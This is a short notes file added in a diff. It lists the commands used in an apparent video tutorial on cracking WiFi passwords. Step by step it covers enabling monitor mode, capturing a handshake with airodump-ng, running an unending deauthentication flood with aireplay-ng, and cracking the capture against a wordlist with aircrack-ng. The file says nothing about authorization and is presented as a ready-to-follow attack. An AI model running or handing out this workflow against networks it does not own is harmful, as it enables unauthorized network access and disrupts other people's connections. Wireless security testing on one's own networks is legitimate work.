@@ -1,0 +1,37 @@
+								COMMANDS USED IN THIS VIDEO
+
+
+ifconfig              ----------> to see if our wlan is connected or not
+
+sudo su			--------> to gain the root access
+
+ifconfig wlan0 down     --------> to get our wlan adapter down
+
+airmon-ng check kill 	-------->  to kill all the process which interfere with getting adapter into monitor mode
+
+iwconfig wlan0 mode monitor  ----> to get our wlan adapter to mode monitor 
+
+ifconfig wlan0 up  	----> to get our wlan up
+
+airmodump-ng  		----> to see all the wifi routers all info....
+
+
+airodump-ng -w(to write) xyz(file) -c(channel) 0,1,2,... --bssid (your bssid) wlan0 (wifi adapter)
+
+###	Side by side ###
+aireplay-ng --deauth 0(not to stop until i want by pressing Ctrl+C) -a our bssid wlan0 (adapter)
+
+
+#### Making the wordlist #### Use ready worldlist or make your own there any many ways to make worlists in more easy and advanced way...####
+
+aircrack-ng xyz-xy.cap( the cap file ) -w (wordlist) filepath
+
+
+
+								Subscribe, Like and Share
+
+
+
+
+
+		 
